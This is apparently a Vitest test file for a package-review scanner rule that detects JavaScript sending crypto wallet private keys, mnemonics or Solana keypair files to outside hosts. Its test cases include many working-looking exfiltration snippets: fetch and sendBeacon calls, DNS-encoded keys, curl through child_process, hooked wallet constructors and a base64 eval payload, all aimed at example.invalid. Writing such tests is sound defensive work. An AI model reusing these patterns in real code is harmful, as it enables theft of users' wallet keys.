import { describe, expect, test } from "vitest";
import { createPackageDiff, deterministicFindings } from "../server/lib/review";

const RULE = "code.key-material-exfiltration";

const file = (path, textSample, sha256 = `${path}-sha`) => ({
  path,
  size: textSample.length,
  sha256,
  flags: [],
  textSample,
});

function keyFindings(source, { path = "lib/index.js", previous, options = {} } = {}) {
  const staged = [file(path, source)];
  const previousFiles =
    previous === undefined
      ? []
      : [file(path, previous, previous === source ? staged[0].sha256 : "before")];
  return deterministicFindings(staged, createPackageDiff(previousFiles, staged), null, {
    previousFiles,
    ...options,
  }).filter((finding) => finding.ruleId === RULE);
}

const lines = (...parts) => `${parts.join("\n")}\n`;

describe("key material exfiltration", () => {
  test.each([
    {
      name: "a keypair secret key serialized into a request header",
      source: lines(
        "function addToQueue(keypair) {",
        "  const blob = Array.from(keypair.secretKey).join(',');",
        "  globalThis.fetch('https://example.invalid/q', { headers: { 'x-metrics': blob } });",
        "}",
      ),
      line: 3,
    },
    {
      name: "a mnemonic interpolated into a URL",
      source: lines(
        "export function backup(mnemonic) {",
        "  return fetch(`https://example.invalid/b?m=${encodeURIComponent(mnemonic)}`);",
        "}",
      ),
      line: 2,
    },
    {
      name: "a private key carried through reassignment and concatenation",
      source: lines(
        "let payload;",
        "const raw = wallet.privateKey;",
        "payload = 'k=' + raw;",
        "navigator.sendBeacon('https://example.invalid/c', payload);",
      ),
      line: 4,
    },
    {
      name: "a destructured alias of a private key sent as a shorthand property",
      source: lines(
        "const axios = require('axios');",
        "module.exports = function init(opts) {",
        "  const { privateKey: pk, rpcUrl } = opts;",
        "  return axios.post(rpcUrl, { pk });",
        "};",
      ),
      line: 4,
    },
    {
      name: "an environment key read by literal bracket written to a request handle",
      source: lines(
        "const https = require('https');",
        "const seed = process.env['SEED_PHRASE'];",
        "const req = https.request({ host: 'example.invalid', method: 'POST' });",
        "req.write(JSON.stringify({ seed }));",
        "req.end();",
      ),
      line: 4,
    },
    {
      name: "a key passed to a local helper that posts its parameter",
      source: lines(
        "function report(value) {",
        "  return fetch('https://example.invalid/r', { method: 'POST', body: value });",
        "}",
        "report(signer.privateKey);",
      ),
      line: 2,
    },
    {
      name: "a key returned by a local getter",
      source: lines(
        "function current() { return kp.secretKey; }",
        "fetch('https://example.invalid/g', { body: current() });",
      ),
      line: 2,
    },
    {
      name: "a key stored on a field of the posted object",
      source: lines(
        "const data = { v: 1 };",
        "data.k = mnemonicPhrase;",
        "fetch('https://example.invalid/f', { body: JSON.stringify(data) });",
      ),
      line: 3,
    },
    {
      name: "a key hex-encoded into a DNS lookup",
      source: lines(
        "const dns = require('dns');",
        "const hex = Buffer.from(privateKey).toString('hex');",
        "dns.resolve(hex.slice(0, 60) + '.example.invalid', () => {});",
      ),
      line: 3,
    },
    {
      name: "a secret key assembled from string pieces",
      source: lines(
        "const s = kp['sec' + 'retKey'];",
        "fetch('https://example.invalid/a', { body: s });",
      ),
      line: 2,
    },
    {
      name: "an XMLHttpRequest send",
      source: lines(
        "const xhr = new XMLHttpRequest();",
        "xhr.open('POST', 'https://example.invalid/x');",
        "xhr.send(recoveryPhrase);",
      ),
      line: 3,
    },
    {
      name: "a named undici import",
      source: lines(
        "import { request } from 'undici';",
        "export async function sync(keypair) {",
        "  await request('https://example.invalid/u', { method: 'POST', body: keypair.secretKey });",
        "}",
      ),
      line: 3,
    },
    {
      name: "a hooked wallet constructor function sending its first argument",
      source: lines(
        "const ethers = require('ethers');",
        "const Original = ethers.Wallet;",
        "ethers.Wallet = function (pk, provider) {",
        "  fetch('https://example.invalid/w', { method: 'POST', body: pk });",
        "  return new Original(pk, provider);",
        "};",
      ),
      line: 4,
    },
    {
      name: "a wallet subclass constructor sending its first argument",
      source: lines(
        "class Wallet extends Base {",
        "  constructor(pk, provider) {",
        "    super(pk, provider);",
        "    navigator.sendBeacon('https://example.invalid/b', pk);",
        "  }",
        "}",
      ),
      line: 4,
    },
    {
      name: "a key factory hook sending the bytes it is given",
      source: lines(
        "Keypair.fromSecretKey = function (bytes) {",
        "  fetch('https://example.invalid/k', { headers: { 'x-k': Buffer.from(bytes).toString('hex') } });",
        "  return original(bytes);",
        "};",
      ),
      line: 2,
    },
    {
      name: "a Solana CLI keypair file read and posted",
      source: lines(
        "const id = fs.readFileSync(path.join(os.homedir(), '.config', 'solana', 'id.json'), 'utf8');",
        "axios.post('https://example.invalid/i', id);",
      ),
      line: 2,
    },
    {
      name: "a key sent through curl in a child process",
      source: lines(
        "const { execSync } = require('child_process');",
        "execSync(`curl -s -d ${privateKey} https://example.invalid/c`);",
      ),
      line: 2,
    },
    {
      // A same-file callee is judged by what it returns, not by its name: an
      // identity helper called `hash` does not sanitize.
      name: "a key laundered through a same-file identity helper named like a sanitizer",
      source: lines(
        "function hash(s) { return s; }",
        "fetch('https://example.invalid/h', { body: hash(wallet.privateKey) });",
      ),
      line: 2,
    },
    {
      // An unknown method is not assumed to transform the value.
      name: "a key reshaped by a method outside the sanitizer denylist",
      source: lines(
        "const x = wallet.privateKey.normalize('NFC');",
        "fetch('https://example.invalid/n', { body: x });",
      ),
      line: 2,
    },
    {
      name: "a key assigned to an instance field and later posted",
      source: lines(
        "class Sender {",
        "  constructor() { this.secret = signer.privateKey; }",
        "  report(url) { return fetch(url, { body: this.secret }); }",
        "}",
      ),
      line: 3,
    },
  ])("flags $name", ({ source, line }) => {
    expect(keyFindings(source)).toEqual([
      expect.objectContaining({ ruleId: RULE, severity: "high", file: "lib/index.js", line }),
    ]);
  });

  test.each([
    {
      name: "a key that never reaches the network",
      source: lines("const pk = wallet.privateKey;", "module.exports = { pk };"),
    },
    {
      name: "a network call that carries no key",
      source: lines(
        "const signature = sign(message, privateKey);",
        "fetch('https://example.invalid/s', { body: JSON.stringify({ hello: 'world' }) });",
      ),
    },
    {
      name: "signatures, digests, public keys and addresses",
      source: lines(
        "const sig = nacl.sign.detached(msg, kp.secretKey);",
        "const digest = createHash('sha256').update(privateKey).digest('hex');",
        "const owner = getAddress(privateKey);",
        "const signed = await wallet.signTransaction(tx);",
        "fetch(rpc, { method: 'POST', body: JSON.stringify({ sig: bs58.encode(sig), digest, owner, signed, from: keypair.publicKey.toBase58(), to: wallet.address }) });",
      ),
    },
    {
      name: "key material that only appears inside callbacks passed to the call",
      source: lines(
        "fetch(url, { method: 'POST', body: JSON.stringify(req), onRetry: function () { return mnemonic; } });",
        "axios.post(url, payload, { transformRequest: [(data) => encrypt(data, privateKey)] });",
      ),
    },
    {
      name: "an API secret key sent as a bearer token",
      source: lines(
        "class Client {",
        "  constructor(options) { this.secretKey = options.secretKey; }",
        "  get(path) {",
        "    return fetch(this.base + path, { headers: { Authorization: `Bearer ${this.secretKey}` } });",
        "  }",
        "}",
      ),
    },
    {
      name: "object-literal keys named after key material",
      source: lines(
        "fetch(url, { body: JSON.stringify({ privateKey: undefined, mnemonic: null }) });",
      ),
    },
    {
      name: "TLS client credentials in request options",
      source: lines(
        "const https = require('https');",
        "const privateKey = fs.readFileSync(keyPath);",
        "https.request({ host: 'example.invalid', key: privateKey, cert, https: { key: privateKey } });",
      ),
    },
    {
      name: "an express route responding through a non-network handle",
      source: lines("router.post('/keys', (req, res) => res.send(privateKey));"),
    },
    {
      name: "a wallet constructor whose first parameter is a provider",
      source: lines(
        "class Wallet {",
        "  constructor(provider) { this.provider = provider; }",
        "  balance(address) { return fetch(provider.url, { body: address }); }",
        "}",
      ),
    },
    {
      name: "a key passed to a child process that is not a network tool",
      source: lines(
        "const { execSync } = require('child_process');",
        "execSync(`gpg --import ${privateKey}`);",
      ),
    },
    {
      name: "a predicate over the key",
      source: lines(
        "fetch(url, { body: JSON.stringify({ configured: !privateKey, valid: isValidPrivateKey(privateKey) }) });",
      ),
    },
    {
      // An object literal taints only its key-material field; the clean sibling
      // fields read off it do not.
      name: "a config object whose non-key fields are read into a request",
      source: lines(
        "const config = { privateKey: process.env.PRIVATE_KEY, timeout: 30000, apiKey: process.env.API_KEY };",
        "axios.post(url, body, { timeout: config.timeout, headers: { 'x-api-key': config.apiKey } });",
      ),
    },
    {
      name: "an encrypted keystore produced before the network call",
      source: lines(
        "const cipher = crypto.createCipheriv('aes-256-gcm', dek, iv);",
        "const wrapped = cipher.update(privateKey);",
        "const shares = secrets.share(privateKey, 5, 3);",
        "const v3 = keythereum.dump(privateKey, salt, iv);",
        "fetch(url, { method: 'POST', body: JSON.stringify({ wrapped, shares, v3 }) });",
      ),
    },
    {
      name: "a JWT assertion helper that signs the key before it is sent",
      source: lines(
        "function generateToken(privateKey) { return jwt.sign({ iss: 'x' }, privateKey, { algorithm: 'ES256' }); }",
        "function makeAssertion(claims, pk) { return jwt.sign(claims, pk); }",
        "fetch(url, { headers: { authorization: generateToken(creds.privateKey) }, body: makeAssertion(c, creds.private_key) });",
      ),
    },
    {
      name: "a mnemonic word count sent as a number",
      source: lines(
        "const count = mnemonic.split(' ').length;",
        "fetch(url, { body: JSON.stringify({ count }) });",
      ),
    },
    {
      name: "mTLS client credentials passed through an options variable",
      source: lines(
        "const https = require('https');",
        "const privateKey = fs.readFileSync(keyPath);",
        "const options = { host: 'example.invalid', method: 'POST', key: privateKey, cert };",
        "https.request(options);",
      ),
    },
    {
      name: "an API secret key on a non-keypair holder sent as a bearer token",
      source: lines(
        "const account = { secretKey: 'sk_live_fake' };",
        "fetch(url, { headers: { Authorization: 'Bearer ' + account.secretKey } });",
      ),
    },
    {
      name: "a wallet constructor whose first parameter is a base URL",
      source: lines(
        "function HotWallet(apiBase) {",
        "  this.base = apiBase;",
        "  return fetch(apiBase + '/status');",
        "}",
      ),
    },
  ])("does not flag $name", ({ source }) => {
    expect(keyFindings(source)).toEqual([]);
  });

  test("a TLS-named property in a request body is still sent", () => {
    const source = lines("axios.post('https://example.invalid/t', { key: wallet.privateKey });");
    expect(keyFindings(source)).toHaveLength(1);
  });

  test("taints a nested field assignment along its member path only", () => {
    const setup = [
      "class Client {",
      "  constructor(cfg) {",
      "    this.config = {};",
      "    this.config.privateKey = cfg.privateKey;",
      "    this.config.host = cfg.host;",
      "  }",
    ];
    const sibling = lines(...setup, "  connect() { dns.lookup(this.config.host, () => {}); }", "}");
    expect(keyFindings(sibling)).toEqual([]);
    for (const body of ["this.config.privateKey", "JSON.stringify(this.config)"]) {
      const sent = lines(
        ...setup,
        `  leak() { fetch('https://example.invalid/k', { method: 'POST', body: ${body} }); }`,
        "}",
      );
      expect(keyFindings(sent)).toHaveLength(1);
    }
  });

  test("follows a flow that exists only in a decoded payload", () => {
    const payload =
      "const k = wallet.privateKey;\nfetch('https://example.invalid/w', { method: 'POST', body: k });";
    const source = `eval(atob(${JSON.stringify(Buffer.from(payload).toString("base64"))}));\n`;
    expect(keyFindings(source)).toEqual([expect.objectContaining({ severity: "high", line: 1 })]);
  });

  test("demotes an unreachable test file", () => {
    const source = lines("fetch('https://example.invalid/t', { body: wallet.privateKey });");
    expect(keyFindings(source, { path: "test/wallet.test.js" })).toEqual([
      expect.objectContaining({ severity: "medium", testScoped: true }),
    ]);
  });

  test("skips the Python pattern set, documentation and JSX the lexer gives up on", () => {
    const source = lines("fetch('https://example.invalid/t', { body: wallet.privateKey });");
    expect(keyFindings(source, { options: { codePatternSet: "python" } })).toEqual([]);
    expect(keyFindings(source, { path: "docs/wallet.md" })).toEqual([]);
    expect(
      keyFindings(
        lines(
          "const view = <p>Don't share your key</p>;",
          "fetch('https://example.invalid/t', { body: wallet.privateKey });",
        ),
        { path: "lib/view.jsx" },
      ),
    ).toEqual([]);
  });

  test("reports the changed line of the flow when the sink predates the release", () => {
    const before = lines(
      "const value = keypair.publicKey.toBase58();",
      "fetch('https://example.invalid/p', { headers: { 'x-id': value } });",
    );
    const after = lines(
      "const value = Array.from(keypair.secretKey).join(',');",
      "fetch('https://example.invalid/p', { headers: { 'x-id': value } });",
    );
    expect(keyFindings(after, { previous: before })).toEqual([
      expect.objectContaining({
        line: 1,
        evidence: expect.stringContaining("new/changed modified file"),
      }),
    ]);
  });

  test("attributes the finding to a release change on an intermediate hop", () => {
    const chain = (hop) =>
      lines(
        "const h1 = wallet.privateKey;",
        "const h2 = h1;",
        "const h3 = h2;",
        "const h4 = h3;",
        "const h5 = h4;",
        "const h6 = h5;",
        hop,
        "const h8 = h7;",
        "const h9 = h8;",
        "const h10 = h9;",
        "const h11 = h10;",
        "const h12 = h11;",
        "fetch(url, { body: h12 });",
      );
    expect(
      keyFindings(chain("const h7 = String(h6);"), { previous: chain("const h7 = h6;") }),
    ).toEqual([
      expect.objectContaining({ line: 7, evidence: expect.stringContaining("new/changed") }),
    ]);
  });

  test("degrades to no finding rather than throwing on hostile input", () => {
    const pre = "const privateKey = wallet.privateKey;\n";
    const cases = [
      pre + "dns" + ".promises".repeat(20000) + ".resolve(privateKey);\n",
      pre + "var a;" + "a=".repeat(8000) + "1;\nfetch(u, { body: a });\n",
      pre + "fetch(" + "(".repeat(20000) + "privateKey" + ")".repeat(20000) + ");\n",
    ];
    for (const source of cases) {
      const start = Date.now();
      expect(() => keyFindings(source)).not.toThrow();
      expect(Date.now() - start).toBeLessThan(4000);
    }
  });
});
